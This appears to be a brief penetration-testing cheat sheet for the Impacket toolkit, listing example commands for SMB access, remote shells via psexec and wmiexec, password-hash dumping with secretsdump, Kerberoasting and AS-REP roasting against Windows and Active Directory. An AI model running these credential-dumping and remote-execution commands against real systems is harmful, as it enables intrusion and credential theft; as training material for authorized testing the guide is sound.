# Impacket

Impacket is a collection of Python tools used to interact with network protocols.

It is widely used during penetration testing of Windows environments and Active Directory.

Impacket supports many protocols including:

- SMB
- NTLM
- Kerberos
- LDAP
- MSRPC

Many Impacket tools are used for credential dumping, remote command execution and lateral movement.

---

# Installation

Impacket is included in Kali Linux.

If not installed:

```bash
sudo apt install impacket-scripts
```

Verify installation: ```bash impacket-secretsdump -h ```

---

# Common Impacket Tools

Some of the most commonly used scripts include:

- secretsdump.py

- psexec.py

- wmiexec.py

- smbclient.py

- GetUserSPNs.py

- GetNPUsers.py

These scripts are commonly used during post-exploitation and Active Directory attacks.

---

# SMB Client

Connect to an SMB share.

Example: ```bash impacket-smbclient username:password@target_ip ```

List available shares: ``` shares ```

---

# Remote Command Execution (psexec)

Execute commands on a remote Windows system.

Example: ```bash impacket-psexec username:password@target_ip ```

This may provide an interactive shell if credentials are valid.

---

# WMI Command Execution

Another method for remote command execution.

Example: ```bash impacket-wmiexec username:password@target_ip ```

This method is often quieter than psexec.

---

# Dumping Password Hashes

Extract password hashes from a Windows system.

Example: ```bash impacket-secretsdump username:password@target_ip ```

This may dump:

- SAM hashes

- cached credentials

- domain credentials (in some cases)

---

# Kerberoasting (GetUserSPNs)

Identify service accounts that can be targeted for Kerberoasting.

Example: ```bash impacket-GetUserSPNs domain/user:password -dc-ip domain_controller_ip ```

---

# AS-REP Roasting

Identify accounts vulnerable to AS-REP roasting.

Example: ```bash impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip domain_controller_ip ```

---

# Useful Notes

Impacket tools are commonly used together with:

- BloodHound

- CrackMapExec

- Mimikatz

These tools are frequently used during Active Directory attacks.

---

# Notes

Impacket tools interact directly with Windows network protocols.

Understanding authentication mechanisms such as NTLM and Kerberos is important when using these tools.

Always use these techniques only in authorized environments.